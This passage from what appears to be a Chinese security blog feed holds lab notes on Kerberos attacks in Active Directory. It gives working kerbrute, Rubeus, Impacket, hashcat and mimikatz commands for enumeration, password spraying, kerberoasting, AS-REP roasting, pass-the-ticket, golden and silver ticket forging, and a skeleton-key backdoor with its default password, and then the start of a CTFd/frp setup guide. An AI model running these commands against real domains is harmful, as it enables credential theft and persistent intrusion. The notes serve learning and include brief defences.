Key，服务长期(加密)密钥）</strong>：这个密钥（服务密钥）基于服务账户。用于加密服务票据和给对<strong>PAC</strong>进行数字签名。</li><li><strong>Session Key（会话密钥）</strong>:KDC在给用户发放TGT时会一同发放会话密钥，用户在请求服务票证时将TGT与会话密钥一同发送给KDC，用户在使用会话向服务证明并请求访问权限。</li><li><strong>PAC（Privilege Attribute Certificate，特权属性证书）</strong>：PAC保存用户的所有相关信息，它与TGT一起发送到KDC，由目标服务长期密钥（Servic LT Key）和KDC长期密钥（KDC LT Key）进行数字签名，以验证用户。</li></ul><h3 id="AS-REQ-x2F-预身份验证-细节"><a href="#AS-REQ-x2F-预身份验证-细节" class="headerlink" title="AS-REQ &#x2F; 预身份验证 细节"></a>AS-REQ &#x2F; 预身份验证 细节</h3><p>当用于向KDC请求TGT时，Kerberos身份验证中的AS-REQ步骤开始。为验证用户并创建TGT，KDC必须遵循确切的步骤。用户的第一步是加密计算出时间戳的NT散列值并将其发送到AS。KDC尝试使用用户提供的NT散列值来解密时间戳，如果成功，KDC将为用户颁发TGT以及会话密钥。（这里的NT hash即NTLM hash的简写）</p><p>附：NT Hash计算方式</p><blockquote><p>NT Hash计算过程相比LM Hash来得简单。</p><ul><li>1.转换为16进制</li><li>2.Unicode编码</li><li>3.MD4加密的16进制就是NT hash</li></ul></blockquote><h3 id="TGT-票据授予票-内容"><a href="#TGT-票据授予票-内容" class="headerlink" title="TGT(票据授予票)内容"></a>TGT(票据授予票)内容</h3><p>为了理解服务票据（service ticket）是如何创建和验证的，我们需要从票据的来源开始。用户将TGT提供给KDC，作为返回（回报），KDC将验证TGT并返回服务票据（service ticket）</p><p><img src="https://i.imgur.com/QFeXDN0.png"></p><h3 id="ST（Service-Ticket即TGS，服务票据）内容"><a href="#ST（Service-Ticket即TGS，服务票据）内容" class="headerlink" title="ST（Service Ticket即TGS，服务票据）内容"></a>ST（Service Ticket即TGS，服务票据）内容</h3><p>要理解kerberos身份验证是如何工作的，你首先要知道明白这些票据的内容和他们是如何验证的。服务票据包含两个部分：服务提供部分和用户提供部分。</p><ul><li>服务部分：用户详细信息、会话密钥；该票证使用服务账户的NTLM哈希加密。</li><li>用户部分：有效的时间戳、会话密钥；使用TGT会话密钥（TGT session key）加密。</li></ul><p><img src="https://i.imgur.com/kUqrVBa.png"></p><h3 id="Kerberos身份验证概述"><a href="#Kerberos身份验证概述" class="headerlink" title="Kerberos身份验证概述"></a>Kerberos身份验证概述</h3><p><img src="https://i.imgur.com/VRr2B6w.png"></p><p>AS-REQ 1. 客户端请求身份验证票据或票据授予票证（TGT）</p><p>AS-REQ 2. 密钥分发中心在身份验证后返回加密的TGT和会话密钥</p><p>AS-REQ 3. 客户端将加密的TGT发送到**票证授予服务器(TGS)**，其中包含客户端想要访问的服务的服务主体名称（SPN）</p><p>AS-REQ 4. 密钥分发中心（KDC）验证用户的TGT以及用户是否有权限访问该服务，然后向客户端发送该服务的有效会话密钥及票据</p><p>AS-REQ 5. 客户端请求服务并发送有效会话密钥以证明用户具有访问权限。</p><p>AS-REQ 6. 服务授予访问权限。</p><h3 id="kerberos票证概述"><a href="#kerberos票证概述" class="headerlink" title="kerberos票证概述"></a>kerberos票证概述</h3><p>在攻击kerberos的过程中，最常见的票证是票证授予票（TGT），这些票证可以有很多形式（后缀），例如Rubeus的<code>.kirbi</code>，Impacket的<code>.ccache</code>。最主要的还是<code>.kirbi</code>票证，这些票证通常是使用base64编码并可以用于各种攻击。TGT仅与KDC一起使用以获得服务票证。一但你提供TGT，服务器就会获取用户详细信息、会话密钥，然后使用服务账户的NTLM哈希对票证（TGT）进行加密。 </p><p>然后你的TGT会提供加密时间戳、会话密钥和加密过的TGT。然后KDC将验证TGT并返回所请求服务的服务票证。普通的TGT只能与连接到它的给定服务账户一起使用（白银票据），但是KRBTGT允许你获取所需的任何票证（黄金票据），从而允许访问你访问域上所需的任何内容。</p><h3 id="kerberos攻击权限要求"><a href="#kerberos攻击权限要求" class="headerlink" title="kerberos攻击权限要求"></a>kerberos攻击权限要求</h3><ul><li>kerbrute枚举-无需域访问</li><li>PTT（Pass The Ticket 传递票据）：以用户身份访问所需的域</li><li>kerberoasting：根据任何用户的需要进行访问</li><li>AS-REP Roasting（AS-REP烘焙）：根据任何用户的需要进行访问</li><li>金票：需要完整的域妥协（domain compromise）（域管理员）</li><li>银票：需要服务哈希</li><li>万能钥匙：需要完整的域妥协（域管理员）</li></ul><h2 id="使用kerbrute进行枚举——检测kerbrute中可利用账户"><a href="#使用kerbrute进行枚举——检测kerbrute中可利用账户" class="headerlink" title="使用kerbrute进行枚举——检测kerbrute中可利用账户"></a>使用kerbrute进行枚举——检测kerbrute中可利用账户</h2><p>kerbrute是一种流行的枚举工具，其原理是利用kerberos的<strong>预身份验证</strong>来暴力破解和枚举有效的活动目录（AD）用户。</p><p>在攻击前需要将DNS域名和计算机IP添加到攻击者计算机内的&#x2F;etc&#x2F;host中，否则攻击将不起作用。</p><p>以下笔记中使用的靶机IP和域控如下</p><p><code>10.10.58.156 CONTROLLER.local</code></p><h3 id="滥用预身份验证概述"><a href="#滥用预身份验证概述" class="headerlink" title="滥用预身份验证概述"></a>滥用预身份验证概述</h3><p>通过强制kerberos预身份验证不会触发账户登陆失败事件，但是可能会给触发设备告警，引起蓝队注意。通过kerberos暴力破解时，可以通过仅向KDC发送单个UDP帧来进行暴力破解，从预先提供好的字典里列举域上的用户。</p><blockquote><p>Kerbrute 安装 - </p><p>1.) 下载适用于您的操作系统的预编译二进制文件 - <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p><p>2.) 将 kerbrute_linux_amd64 重命名 为 kerbrute</p><p>3.) <code>chmod +x kerbrute</code> - 使 kerbrute 可执行</p></blockquote><h3 id="Kerbrute使用"><a href="#Kerbrute使用" class="headerlink" title="Kerbrute使用"></a>Kerbrute使用</h3><p>进入kerbrute目录后，准备好爆破用用户名字典，使用以下命令运行Kerbrute爆破域中存在的账户</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;kerbrute usernum --dc CONTROLLER.local -d CONTROLLER.local User.txt</code></pre><h2 id="使用Rubeus暴力破解-x2F-收割票证"><a href="#使用Rubeus暴力破解-x2F-收割票证" class="headerlink" title="使用Rubeus暴力破解&#x2F;收割票证"></a>使用Rubeus暴力破解&#x2F;收割票证</h2><p>Rubeus是用于攻击Kerberos的工具。Rubeus是kekeo工具的改编版，更加强大。Rubeus具有多种攻击方式和功能，包括跨越哈希（Overpass the hash&#x2F;Pass-the-Key），票证请求（Ticket Request）和票证延期（renewals），票证管理，票证提取，收获，传递票证（pass the ticket），AS-REP烘焙（AS-REP Roasting）和kerberoasting</p><h3 id="使用rubeus获取票证"><a href="#使用rubeus获取票证" class="headerlink" title="使用rubeus获取票证"></a>使用rubeus获取票证</h3><p>通过截获正在传递到KDC的票证并将其保存以用于其他攻击，例如PTT</p><p>攻击命令如下</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe harvest &#x2F;interval:30</code></pre><p>该命令告诉RUbeus每30s收集一次TGT</p><h3 id="使用Rubeus进行暴力破解密码-x2F-密码喷射"><a href="#使用Rubeus进行暴力破解密码-x2F-密码喷射" class="headerlink" title="使用Rubeus进行暴力破解密码&#x2F;密码喷射"></a>使用Rubeus进行暴力破解密码&#x2F;密码喷射</h3><blockquote><p>Rubeus 既可以暴力破解密码，也可以喷洒密码用户帐户。当暴力破解密码时，您可以使用单个用户帐户和密码单词列表来查看哪个密码适用于该给定用户帐户。在密码喷射中，您提供一个密码（例如Password1），然后对域中找到的所有用户帐户进行“喷射”，以查找哪些帐户可能拥有该密码。</p><p>此攻击将获取给定的基于 Kerberos 的密码，并将其喷洒到所有找到的用户上，并提供 .kirbi 票证。该票证是一个TGT，可用于从 KDC 获取服务票证，也可用于诸如传递票证攻击之类的攻击。</p></blockquote><p>在使用Rubeus进行密码喷洒之前，，需要将域控制器域名添加到windows的主机文件中。可以直接使用echo命令将IP和域名添加到计算机的主机文件中</p><pre class="line-numbers language-none"><code class="language-none">echo 10.01.147.97 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre><p>Rubeus喷洒密码命令</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe brute &#x2F;password:Password1 &#x2F;noticket</code></pre><p>以上命令将使用给定密码（上面命令中指定的是Password1）喷洒到所有找到的账户中，然后为该用户提供.kirbi TGT（即将上文中抓取到的TGT给现在爆破出来的用户使用）</p><p>ps：在进行像喷洒密码这种包里攻击时大概率会触发安全策略而导致账户锁定。</p><h2 id="使用Rubeus和Impacket进行kerberoasting"><a href="#使用Rubeus和Impacket进行kerberoasting" class="headerlink" title="使用Rubeus和Impacket进行kerberoasting"></a>使用Rubeus和Impacket进行kerberoasting</h2><p>这里将介绍kerberos中最流行的攻击之一——kerberoasting。kerberoasting允许用户请求具有注册SPN的任何服务的服务票证，然后使用该票证破解服务密码（服务账户）。如果一个服务有注册SPN，那么它是Kerberoastable的。但是攻击的成功取决于密码的强度、密码是否可追踪以及被破解的服务账户的权限。</p><p>要枚举Kerberoastable账户，建议使用BloodHound之类的工具来查找所有kerberoastable账户它允许你查看可以对哪些账户进行kerberoast（如果它们是域管理员），以及它们与域的其余部分有什么样的连接等等。</p><p>这里将使用Rubeus和Impacket进行攻击，同样的使用kekeo和Invoke-Kerberoast也能进行攻击。</p><h3 id="使用Rubeus进行Kerberoasting"><a href="#使用Rubeus进行Kerberoasting" class="headerlink" title="使用Rubeus进行Kerberoasting"></a>使用Rubeus进行Kerberoasting</h3><p>ps：以下操作是在内网机器上进行操作的。</p><p>以下命令将转储任何kerberoastable用户的Kerberos哈希值</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe kerberoast</code></pre><p><img src="https://i.imgur.com/XZegVqf.png"></p><p>将获得的hash储存到本地的.txt文件中，然后使用hashcat破解它。</p><p>使用hashcat破解需要提前准备好密码字典</p><p>破解命令</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 -a 0 hash.txt password.txt</code></pre><h3 id="使用Impacket进行kerberoasting"><a href="#使用Impacket进行kerberoasting" class="headerlink" title="使用Impacket进行kerberoasting"></a>使用Impacket进行kerberoasting</h3><blockquote><p>Impacket安装教程</p><p>自 0.9.20 以来，Impacket 版本一直不稳定，我建议安装 Impacket &lt; 0.9.20</p><p>1.)<code>cd /opt</code> 导航到您的首选目录以保存工具 </p><p><a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19">2.) 从https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19</a>下载预编译包 </p><p>3.)<code>cd Impacket-0.9.19</code> 导航到 impacket 目录</p><p>4.) <code>pip install .</code>- 这将安装所有需要的依赖项</p></blockquote><p>Impacket使用命令</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;doc&#x2F;python3-impacket&#x2F;examples &#x2F;&#x2F;进入GetUserSPNs.py所在位置</code></pre><pre class="line-numbers language-none"><code class="language-none">sudo python3 GetUserSPNs.py controller.local(域名)&#x2F;Machine1(机器名称):Password(密码) -dc-ip 目标机器IP -request</code></pre><p>↑这将转储它可以在目标域上找到的所有kerberoastable账户的kerberos哈希值，就像Rubeus所做的那样；但是与Rubeus不同的是它不用再目标机器上进行操作，并且可以远程完成。</p><p>破解hash步骤相同</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 -a 0 hash.txt Pass.txt</code></pre><h3 id="获得服务账户后可以做什么？"><a href="#获得服务账户后可以做什么？" class="headerlink" title="获得服务账户后可以做什么？"></a>获得服务账户后可以做什么？</h3><p>破解服务账户的账号密码后有多种方式可以窃取数据和收集所需要的信息。具体取决于服务账户是否为域管理员，如果<strong>服务账户是域管理员，那么就相当于获取了类似金&#x2F;银票据的控制权</strong>，可以收集所需的数据和信息，例如转储NTDS.dit.</p><blockquote><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p></blockquote><p>如果服务账户不是域管理员，那么可以使用它登录其他系统并尝试进行提权。或者可以使用破解的密码来攻击其他服务和域管理员账户；许多公司可能会为其服务或域管理账户重复使用相同或者相似的密码。</p><h3 id="Kerberoasting防御方法"><a href="#Kerberoasting防御方法" class="headerlink" title="Kerberoasting防御方法"></a>Kerberoasting防御方法</h3><ul><li>设置强密码，如果服务账户的密码强，那么kerberoasting将无效</li><li>不将服务账户设置为域管理员，服务账户不需要是域管理员，不将服务账户设置为域管理员，那么kerberoasting攻击成功后的利用难度将增大，不会那么有效。</li></ul><h2 id="使用Rubeus进行AS-REP-roasting"><a href="#使用Rubeus进行AS-REP-roasting" class="headerlink" title="使用Rubeus进行AS-REP roasting"></a>使用Rubeus进行AS-REP roasting</h2><p>域kerberos roasting类似，AS-REP roasting 转储禁用了kerberos预身份验证的用户账户的krbasrep5 hash值。与Kerberoasting不同，这些用户不必是服务账户。对用户进行AS-REP roasting的唯一要求是用户禁用预身份验证。</p><p>这里将继续使用Rubeus，就像进行kerberosroasting和收获一样，Rubeus有一个简单且易于理解命令，可以在禁用kerberos预身份验证的情况下对AS-REP进行roasting和攻击用户。从Rubeus转储hash后，我们将继续使用hashcat来破解krbasrep5哈希值。</p><p>同样的，不止Rubeus可以进行AS-REP Roasting ，keko和impacket的GetNPUsers.py也行。不过Rubeus更易用，它会自动查找AS-REP Roastable用户，而使用GetNPUsers必须事先枚举用户并知道那些用户是AS-REP Roastable。</p><h3 id="AS-REP-Roasting-概述"><a href="#AS-REP-Roasting-概述" class="headerlink" title="AS-REP Roasting 概述"></a>AS-REP Roasting 概述</h3><p>在预身份验证期间，用户hash将用于加密时间戳，域控制器将尝试解密时间戳以验证是否正在使用正确的哈希并且不会重播先前的请求( the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request)。</p><p>验证时间戳后，KDC将为用户颁发TGT。如果禁用预身份验证，你可以请求任何复用的任何身份验证数据，并且KDC将返回一个可以离线破解的加密TGT，因为KDC会跳过验证用户真是身份步骤（可以伪装用户身份）</p><h3 id="使用Rubeus转储kerbasrep5哈希值"><a href="#使用Rubeus转储kerbasrep5哈希值" class="headerlink" title="使用Rubeus转储kerbasrep5哈希值"></a>使用Rubeus转储kerbasrep5哈希值</h3><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe aseproast</code></pre><p>以上命令将运行 AS-REP Roast 命令来查找易受攻击的用户，然后转储找到的易受攻击的用户哈希值。</p><p>获取hash后继续使用hashcat进行破解</p><pre class="line-numbers language-none"><code class="language-none">hashcat -m 18200 hash.txt Passwd.txt &#x2F;&#x2F;Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </code></pre><blockquote><p>用 hashcat 破解这些哈希 - </p><p>1.) 将哈希值从目标计算机传输到攻击者计算机，并将哈希值放入 txt 文件中</p><p>2.) 在$krb5asrep$后面插入23$，这样第一行就是$krb5asrep$23$User…..</p><p>3.) <code>hashcat -m 18200 hash.txt Pass.txt</code> - 破解这些哈希值！Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </p></blockquote><p><img src="https://i.imgur.com/eOqGVrm.png"></p><h3 id="AS-REP-Roasting预防措施"><a href="#AS-REP-Roasting预防措施" class="headerlink" title="AS-REP Roasting预防措施"></a>AS-REP Roasting预防措施</h3><ul><li>使用强密码，这将耗费更多时间用于hash破解</li><li>除非有必要，不要关闭kerberos预身份验证，除了打开预身份验证外，几乎没有颁发可以完全缓解这种攻击。</li></ul><h2 id="使用mimikatz进行传递票据（PTT-Pass-The-Ticket）"><a href="#使用mimikatz进行传递票据（PTT-Pass-The-Ticket）" class="headerlink" title="使用mimikatz进行传递票据（PTT,Pass The Ticket）"></a>使用mimikatz进行传递票据（PTT,Pass The Ticket）</h2><p>mimikatz属于后渗透利用工具，是非常流行且功能强大，最常用于活动目录网络内转储用户凭据，在这里我们将使用mimikatz从LSASS中转储TGT</p><h3 id="PTT-x2F-Pass-The-Ticket-概述"><a href="#PTT-x2F-Pass-The-Ticket-概述" class="headerlink" title="PTT&#x2F;Pass The Ticket 概述"></a>PTT&#x2F;Pass The Ticket 概述</h3><p>PTT通过从机器的LSASS内存中转储TGT。LSASS（Local Security Subsystem Servic，本地安全机构子系统服务）是一个内存进程，它将凭据储存在活动目录的服务器上，并且可以储存Kerberos票证以及其他凭据类型，以充当网守（gatekeeper）并接受或者拒绝所提供的凭据。攻击者可以从LSASS内存中转储kerberos票证，就像转储hash一样。</p><p>当使用mimikatz转储票证时，它会给我们一个.kirbi票证。如果域管理员票证位于LSASS内存中，则可以使用该票证获得域管理员。如果存在不安全的与服务账户票证，则此攻击对于权限提升和横向移动非常有用。</p><p>如果转储域管理员的票证，然后使用mimikatz PTT攻击模拟该票证，便可以通过该攻击升级为域管理员。PTT攻击的原理就是重用现有票证，并不会创建或者销毁任何票证，只是重用域中其他用户的现有票证并冒充该票证。</p><h3 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a>mimikatz使用</h3><p>cmd输入以下命令启动mimikatz（需要管理员权限）</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe</code></pre><p>输入一下命令来检查是否以管理员权限运行</p><pre class="line-numbers language-none"><code class="language-none">privilege::debug</code></pre><p>如果正确，则输出[output ‘20’ OK]</p><p><img src="https://i.imgur.com/SJQGplV.png"></p><pre class="line-numbers language-none"><code class="language-none">sekulsa::ticket &#x2F;export</code></pre><p>上面的命令会将所有的.kribi票证导出到当前目录中</p><blockquote><p>在此步骤中，您还可以使用我们之前从 Rubeus 获取的 Base 64 编码票证</p></blockquote><p>在导出的票证中寻到管理员票证，就如图中所示</p><p><img src="https://i.imgur.com/xC0L5Kf.png"></p><h3 id="使用mimikatz进行PTT"><a href="#使用mimikatz进行PTT" class="headerlink" title="使用mimikatz进行PTT"></a>使用mimikatz进行PTT</h3><p>我们现在已经准备好了飘逸，可以进行PTT攻击获得域管理员权限。</p><p>在mimikatz中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &lt;ticket&gt;</code></pre><p>上面的ticket是上文中转储的.kirbi票据的全称</p><p><img src="https://i.imgur.com/DwXmm8Z.png"></p><p>使用<code>klist</code>命令来列出缓存中票证以验证我们是否成功模拟票证</p><p><img src="https://i.imgur.com/GgxDm9k.png"></p><p>模拟成功，现在我们已经拥有了和域管理员相同的权力</p><p>可以查看管理员共享</p><p><img src="https://i.imgur.com/9nxjeTS.png"></p><h3 id="PTT攻击的防御方式"><a href="#PTT攻击的防御方式" class="headerlink" title="PTT攻击的防御方式"></a>PTT攻击的防御方式</h3><p>不要让域管理员登录到除了域控制器以外的任何东西。如果域管理员仍登录到一些低级别计算上，容易留下用于攻击和横向移动的票证。</p><h2 id="使用mimikatz进行金-x2F-银票据攻击"><a href="#使用mimikatz进行金-x2F-银票据攻击" class="headerlink" title="使用mimikatz进行金&#x2F;银票据攻击"></a>使用mimikatz进行金&#x2F;银票据攻击</h2><p>有些时候，在限制条件下银票比金票更合适，因为它更谨慎一些。如果<strong>隐身</strong>和<strong>不被发现</strong>很重要，那么银票可能是比金票更好的选择。但是创建票证的方法是完全相同的，两种票证的主要区别在于银票仅限于目标服务，而金票可以访问任何kerberos服务。</p><h3 id="KRBTGT概述"><a href="#KRBTGT概述" class="headerlink" title="KRBTGT概述"></a>KRBTGT概述</h3><p>为了理解这些攻击原理，首要要先了解KRBTGT和TGT之间的区别。KRBTGT是KDC的的服务账户，是向客户发送所有票证的密钥分发中心。</p><p>如果模拟此账户并从KRBTGT创建黄金票证，那么就可以为想要的任何内容创建服务票证。TGT是KDC办法的服务账户票证，只能访问TGT所属的服务，就像SQLService票证一样。</p><h3 id="金银票攻击概述"><a href="#金银票攻击概述" class="headerlink" title="金银票攻击概述"></a>金银票攻击概述</h3><p>金票攻击的工作原理是转储域中任何用户的票证授予票（TGT），这最好是域管理员。</p><p>但是对于金票，要转储的是krbtgt票，对于银票，要转储的是域管理员票。这将为你提供服务&#x2F;域管理员账户的SID或安全标识符（每个用户账户的唯一标识符）以及NTLM哈希，然后可以再mimikat黄金票据攻击中使用这些详细信息，以创建模拟给定服务账户信息的TGT。</p><h3 id="转储krbtgt哈希"><a href="#转储krbtgt哈希" class="headerlink" title="转储krbtgt哈希"></a>转储krbtgt哈希</h3><p>确保mimikatz是以管理员身份运行</p><pre class="line-numbers language-none"><code class="language-none">lsadump::lsa &#x2F;inject &#x2F;name:krbtgt</code></pre><p>以上命令将转储hash以及创建金票据所需的安全标识符。</p><p>如果要创建银票，需要更改<code>/name:要转储的域管理员账户或者服务账户（例如 SQLService）</code>的hash</p><p><img src="https://i.imgur.com/VOEsU4O.png"></p><h3 id="创建金-x2F-银票"><a href="#创建金-x2F-银票" class="headerlink" title="创建金&#x2F;银票"></a>创建金&#x2F;银票</h3><pre class="line-numbers language-none"><code class="language-none">Kerberos::golden &#x2F;user:Administrator &#x2F;domain:ontroller.local &#x2F;sid: &#x2F;krbtgt: &#x2F;id:</code></pre><p>以上是创建金票的命令，创建银票只需要将服务NTLMhash放入krbtgt槽中，服务账户的sid放入sid，并将id更改为103</p><p>金票据创建实例图</p><p><img src="https://i.imgur.com/rh06qDl.png"></p><h3 id="使用金银票访问其他机器"><a href="#使用金银票访问其他机器" class="headerlink" title="使用金银票访问其他机器"></a>使用金银票访问其他机器</h3><pre class="line-numbers language-none"><code class="language-none">misc::cmd</code></pre><p>使用以上命令将在mimikatz中<strong>使用给定的票证</strong>打开一个新的提升命令提示符</p><p><img src="https://i.imgur.com/6HnEnwi.png"></p><p>访问你想要的计算机，你可以访问的内容取决于从票据中获取的用户权限。如果是从krbtgt中获取的票证，那么可以访问整个网络，因此称其为黄金票证。</p><p>然而，银票只能访问用户有权访问的内容，如果他是域管理员，那么几乎可以访问整个网络，但是提升成都比黄金票据稍低。</p><p><img src="https://i.imgur.com/BSh4rXy.png"></p><p>（如果域中没有其他计算机，此攻击将无法进行）</p><h2 id="使用mimiatz植入kerberos后门"><a href="#使用mimiatz植入kerberos后门" class="headerlink" title="使用mimiatz植入kerberos后门"></a>使用mimiatz植入kerberos后门</h2><p>除了使用金银票据维持访问权限以外，在攻击kerberos时，还可以使用mimikatz植入后门。kerberos的后门更加隐蔽，因为其类似于rootkit，将其自身植入域林中，允许自己使用主密码访问任何计算机</p><p>kerberos后门的工作原理是植入万能钥匙，该万能钥匙密码滥用AS-REQ验证加密时间戳的方式。万能密码仅适用于使用Kerberos RC4加密的情况。</p><p>ps：根据上文，执行此攻击需要获取域管理员权限。</p><blockquote><p>mimikatz 万能密钥的默认哈希值是 <em>60BA4FCADC466C7A033C178194C03DF6</em>，密码 是“ <em>mimikatz</em> ”</p></blockquote><h3 id="万能钥匙概述"><a href="#万能钥匙概述" class="headerlink" title="万能钥匙概述"></a>万能钥匙概述</h3><p>万能钥匙的工作原理是滥用AS-REQ加密时间戳。时间戳是使用用户NT hash进行加密的，然后域控制器尝试使用用户NT hash来解密此时间戳，一但植入万能钥匙，域控制器将尝试使用用户NT hash和万能钥匙NT hash来解密时间戳，从而允许攻击者访问域林。</p><h3 id="使用mimikatz安装万能钥匙"><a href="#使用mimikatz安装万能钥匙" class="headerlink" title="使用mimikatz安装万能钥匙"></a>使用mimikatz安装万能钥匙</h3><p>以管理员模式打开mimikatz</p><pre class="line-numbers language-none"><code class="language-none">misc:skeleton</code></pre><p>只需要上面一条命令即可</p><h3 id="进入域林"><a href="#进入域林" class="headerlink" title="进入域林"></a>进入域林</h3><p>默认凭据为：“ <em>mimikatz</em> ”</p><p>示例：<code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - 现在无需管理员密码即可访问共享</p><p>示例：<code>dir \\Desktop-1\c$ /user:Machine1 mimikatz</code> - 访问 Desktop-1 的目录，而不知道哪些用户有权访问 Desktop-1</p><p>万能钥匙不会自行持久保存，因为它在内存中运行，可以使用其他工具和技术对其进行脚本化或持久保存。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在这个房间里，经历的kerberos攻击的基本流程，从枚举可利用账户开始，再到使用Rubeus进行密码爆破获得账户密码，最后再到使用使用mimikatz转储票据，进行金银票攻击，直至最后在域林中植入万能钥匙后门。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;



&lt;h1 id=&quot;kerberos攻击学习&quot;&gt;&lt;a href=&quot;#kerberos攻击学习&quot; class=&quot;headerlink&quot; title=&quot;kerberos攻击学习&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="技术" scheme="https://mizore.site/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CTFD动态靶场搭建</title>
    <link href="https://mizore.site/article/CTFD%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/CTFD%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
    <id>https://mizore.site/article/CTFD%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/CTFD%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</id>
    <published>2023-08-27T05:53:52.929Z</published>
    <updated>2024-11-24T16:51:49.998Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="CTFD动态靶场搭建"><a href="#CTFD动态靶场搭建" class="headerlink" title="CTFD动态靶场搭建"></a>CTFD动态靶场搭建</h1><p>为了迎接未来的新生赛和未来接活做准备，学习一下如何搭建CTFD靶场顺便练练手。不过这中间踩的坑也是巨多，前前后后搭了好几天才搭好。</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>CTFD使用的是的docker搭建，所以在服务器上需要先装好docker和docker-compose。其中ctfd有多种搭建方式，我采用的是服务器本地起frp服务将题目容器转发到服务器的端口上。</p><h2 id="安装FRP"><a href="#安装FRP" class="headerlink" title="安装FRP"></a>安装FRP</h2><p>下载并安装rp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gzcd frp_0.29.0_linux_amd64cd frp_0.29.0_linux_amd64sudo cp systemd&#x2F;* &#x2F;etc&#x2F;systemd&#x2F;system&#x2F; #移动配置文件sudo mkdir &#x2F;etc&#x2F;frp #创建客户端配置文件sudo cp frpc.ini  frps.ini &#x2F;etc&#x2F;frp&#x2F; #移动客户端配置文件sudo cp frpc  frps &#x2F;usr&#x2F;bin&#x2F; #将客户端和服务端的二进制文件移动至bin文件夹sudo chmod a+x &#x2F;usr&#x2F;bin&#x2F;frpc &#x2F;usr&#x2F;bin&#x2F;frps #给所有用户赋予frpc和frps的可执行权限sudo systemctl enable frps #将frps服务设置为每次开机启动</code></pre><p>编辑frps配置文件</p><pre class="line-numbers language-none"><code class="language-none">vim &#x2F;etc&#x2F;frp&#x2F;frps.ini[common]bind_port &#x3D; 7897bind_addr &#x3D; 0.0.0.0token &#x3D;thisistoken</code></pre><p>启动frps服务</p><pre class="line-numbers language-none"><code class="language-none">systemctl start frps</code></pre><p> 修改&#x2F;etc&#x2F;frp&#x2F;frpc.ini的配置文件</p><p>此处的frpc与上面的frps相对应，连接的是上面启动的frps</p><pre class="line-numbers language-none"><code class="language-none">vim &#x2F;etc&#x2F;frp&#x2F;frpc.ini[common]server_addr &#x3D; 172.17.0.1#此处的IP为docker0的ip，docker0的ip通过ifconfig查看server_port &#x3D; 7897token&#x3D;thisistoken</code></pre><p>再修改frp_0.29.0_linux_amd64&#x2F;frpc.ini  (这个文件会用来配置frpc容器的)</p><pre class="line-numbers language-none"><code class="language-none">[common]server_addr &#x3D; 172.17.0.1server_port &#x3D; 7897token&#x3D;thisistokenadmin_addr &#x3D; 172.20.0.3admin_port &#x3D; 7400log_file &#x3D; .&#x2F;frps.log</code></pre><p>创建网络并运行frpc容器</p><pre class="line-numbers language-none"><code class="language-none">docker network create ctfd_frp-containers #创建一个docker网络，名称为ctfd_frp-containersdocker run  -d -v ~&#x2F;frp_0.29.0_linux_amd64&#x2F;frpc.ini:&#x2F;etc&#x2F;frp&#x2F;frpc.ini --network&#x3D;&quot;ctfd_frp-containers&quot; --restart&#x3D;always &quot;glzjin&#x2F;frp&quot;  #运行容器并将本地的frpc.ini挂载到容器内。网络名称为ctfd_frp-containers</code></pre><p>接着创建frpcadmin网络用语ctfd和frpc容器通信</p><pre class="line-numbers language-none"><code class="language-none">docker network creat frcadmindocker network connect frpcamdin id&lt;刚才启动的frpc容器ID&gt;</code></pre><p>查看frpcadmin网络的连接情况并记录frpc容器的网络IP</p><pre class="line-numbers language-none"><code class="language-none">docker network inspect frpcadmin</code></pre><p>图中的IP就是frpc容器在frpcadmin网络中的IP地址，就是我们在&#x2F;frp&#x2F;frpc.ini中指定的（admin_addr）</p><p><img src="https://gitee.com/shark-rice/images/raw/master/202308271348486.png" alt="image-20230820205128158"></p><p>可以提前把这个地址记录下来，后面配置ctfd-whale的时候会用到。</p><h2 id="安装CTFd和CTFd-whale"><a href="#安装CTFd和CTFd-whale" class="headerlink" title="安装CTFd和CTFd-whale"></a>安装CTFd和CTFd-whale</h2><pre class="line-numbers language-none"><code class="language-none">#下载ctfdgit clone https:&#x2F;&#x2F;github.com&#x2F;CTFd&#x2F;CTFd.git#进入CTFd目录cd CTFd#回退到某个版本，直接执行下面命令git reset 6c5c63d667a17aec159c8e26ea53dccfbc4d0fa3 